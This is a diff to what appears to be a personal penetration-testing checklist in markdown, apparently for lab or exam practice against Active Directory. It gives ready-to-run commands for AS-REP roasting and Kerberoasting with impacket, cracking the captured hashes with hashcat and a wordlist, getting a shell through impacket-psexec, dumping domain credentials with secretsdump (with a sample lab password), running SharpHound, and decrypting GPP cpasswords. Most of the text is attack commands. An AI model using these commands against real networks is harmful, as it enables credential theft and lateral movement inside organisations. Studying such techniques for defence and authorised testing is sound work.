@@ -20,14 +20,24 @@ If AD detected:
 Run `impacket-GetNPUsers -dc-ip <domain controller ip>  -request -outputfile hashes.asreproast <domain>/<user>` (eg `impacket-GetNPUsers -dc-ip <domain controller ip> -request -outputfile hashes.asreproast corp.com/<user>`). Then run `hashcat --help | grep -i "Kerberos"` and find the AS-REP mode for hashcat (it should be 18200, if not change the mode in the next command), then run `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
 </details>
 
-- Check for Kerberoasting (Requires user and plaintext password)
+- (Requires user and plaintext password) Get a shell on victim
+<details>
+`impacket-psexec <domain>/<user>:<pw>@<dc ip>` Make sure its / not \. Also only works if the user has sufficient perms
+</details>
+
+- (Requires user and plaintext password) Check for Kerberoasting
 <details>
 `sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain>/<user>` then `sudo hashcat -m 13100 <hash file> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
 </details>
 
-- [Not sure if should add to procedure cus depends on factor which might be v rare] Check for Domain Backup Abuse (Requires user and plaintext password)
+- (Requires user and plaintext password) [Not sure if should add to procedure cus depends on factor which might be v rare] Check for Domain Backup Abuse
 <details>
 `impacket-secretsdump -just-dc-user <target user> <domain>/<user w perms>:<password>@<ip>` (eg `impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`)
+</details>
+
+- (Requires user and plaintext password) Bloodhound it from Windows VM
+<details>
+connect to the vpn on your windows vm. make sure u can ping the machine, then `.\SharpHound.exe -c all -d <domain> --domaincontroller <dc ip>`. if not working, go Control Panel > Network and Ethernet > Network and Sharing Center > Change adapter settings (on the left bar) > Right-click either and go to properties > doubleclick on IPv4 properties > Preferred DNS server change to the DC IP i think. if still dont work change the other ethernet/interface
 </details>
 </details>
 
@@ -53,7 +63,7 @@ If found:
 
 - NTLM hash: refer to [NTLM](/docs/procedure/NTLM)
 - [AD](/docs/general/AD#enumeration)
-- cpassword hash: in gpp-decrypt in cybertools, `source venv/bin/activate` then `python3 gpp-decrypt.py -c <hash>` or `python3 gpp-decrypt.py -f <xml file>.xml`
+- cpassword hash: `gpp-decrypt.py <hash>`
 
 Errors:
 
